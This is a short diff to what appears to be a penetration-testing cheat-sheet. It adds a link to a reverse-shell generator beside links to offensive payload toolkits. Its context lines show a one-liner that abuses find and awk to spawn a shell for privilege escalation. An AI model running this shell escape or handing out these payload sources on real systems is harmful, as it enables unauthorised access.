@@ -62,6 +62,7 @@ playloads generate:
   https://github.com/samratashok/nishang
   https://github.com/bats3c/darkarmour
 
+  https://www.revshells.com/
 
 find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 
